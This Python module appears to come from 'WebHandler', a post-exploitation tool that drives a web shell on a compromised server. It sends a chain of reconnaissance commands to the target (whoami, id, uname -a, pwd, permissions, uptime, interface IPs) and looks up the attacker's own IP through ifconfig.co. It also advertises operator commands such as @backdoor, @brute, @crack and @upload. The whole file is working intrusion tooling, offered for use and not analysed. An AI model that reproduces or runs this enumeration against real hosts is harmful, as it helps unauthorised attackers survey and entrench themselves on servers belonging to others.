import datetime
from urllib2 import urlopen, Request

from core.libs.menu import getargs
from core.libs.request_handler import make_request
from core.libs.thirdparty.termcolor import colored


class TargetBox(object):
    def __init__(self, url=None):
        if not getargs.banner:
            self.url = url
            self.cmd = 'if [ `whoami 2> /dev/null|wc -l` -ge 1 ];then whoami;else echo "unkown" ;fi;'
            self.cmd += 'if [ `id 2> /dev/null|wc -l` -ge 1 ];then id;else echo "unknown" ;fi;'
            self.cmd += 'if [ `uname 2> /dev/null|wc -l` -ge 1 ];then uname -a;else echo "unknown" ;fi;'
            self.cmd += 'if [ `pwd 2> /dev/null|wc -l` -ge 1 ];then pwd;else echo "unknown" ;fi;'
            self.cmd += 'ls -ld `pwd` | awk \'{print $1}\';'
            self.cmd += 'bash -c "input=\$(uptime); if [[ \$input == *day* ]]; then out=\$(echo \$input | awk \'{print \$3\\" days\\"}\'); if [[ \$input == *min* ]]; then out=\$(echo \\"\$out and \\" && echo \$input | awk \'{print \$5\\" minutes\\"}\'); else out=\$(echo \\"\$out, \\" && echo \$input | awk \'{print \$5}\' | tr -d \\",\\" | awk -F \\":\\" \'{print \$1\\" hours and \\"\$2\\" minutes\\"}\'); fi elif [[ \$input == *min* ]]; then out=\$(echo \$input | awk \'{print \$3\\" minutes\\"}\'); else out=\$(echo \$input | awk \'{print \$3}\' | tr -d \\",\\" | awk -F \\":\\" \'{print \$1\\" hours and \\"\$2\\" minutes\\"}\'); fi; echo \$out;" ;'
            self.cmd += "/sbin/ifconfig | grep -e 'inet addr' | grep -v '127.0.0.1' | cut -f2 -d':' | cut -f1 -d' '"

            self.available_commands = ['@backdoor', '@download', '@enum', '@history', '@info', '@update', '@upload', '@brute', '@crack', '@mysql', ':alias', 'exit']

    def get_information(self):
        now = datetime.datetime.now()

        # Call get_page_source() method then assign it to self.source
        source = make_request.get_page_source(self.cmd) if not getargs.banner else []

        source = iter(source)
        self.current_user = next(source, "bash")
        self.current_id = next(source, "host")
        self.kernel_info = next(source, "kernel info")
        self.cwd = next(source, "cwd")
        self.perm_cwd = next(source, "permission")
        self.uptime = next(source, "uptime")
        self.host_ip = next(source, "Host")
        self.session = now.strftime("%Y-%m-%d")
        if getargs.url:
            self.url = '/'.join(getargs.url.split('/', 3)[:3])
        else:
            self.url = "n/a"

        try:
            # Get the attacker's ip address (Thanks @mandreko)
            request = Request("http://ifconfig.co", headers={"User-Agent" : "curl/7.51.0"})
            self.local_ip = (urlopen(request, timeout=3).read()).strip() if not getargs.banner else 'Unknown'
        except:
            self.local_ip = 'Unknown'

        self.info = '\t' + '-' * int(len(self.kernel_info) + 18) + '\n'
        self.info += colored("\tUser         : ", 'red') + colored(self.current_user, 'green') + '\n'
        self.info += colored("\tID           : ", 'red') + colored(self.current_id, 'green') + '\n'
        self.info += colored("\tKernel       : ", 'red') + colored(self.kernel_info, 'green') + '\n'
        self.info += colored("\tCWD          : ", 'red') + colored(self.cwd, 'green') + colored('\t\t' + self.perm_cwd, 'yellow', attrs=['bold']) + '\n'
        self.info += colored("\tUptime       : ", 'red') + colored(self.uptime, 'green') + '\n'
        self.info += colored("\tTarget's IPs : ", 'red') + colored(self.host_ip, 'green') + '\n'
        self.info += colored("\tOur IP       : ", 'red') + colored(self.local_ip, 'green') + '\n'
        self.info += '\t' + '-' * int(len(self.kernel_info) + 18)
        self.info += "\n\n"

        self.info += colored("\t[+] Available commands: " + ', '.join(self.available_commands), 'blue', attrs=['underline', 'bold']) + '\n' \
        if not getargs.banner else ''
        self.info += colored("\t[+] Inserting ! at the begining of the command will execute the command locally (on your box)", 'blue', attrs=['underline', 'bold'])
        self.info += "\n"
        if not getargs.banner:
            return self.info
        else:
            return 'Welcome to WebHandler'

info = TargetBox()
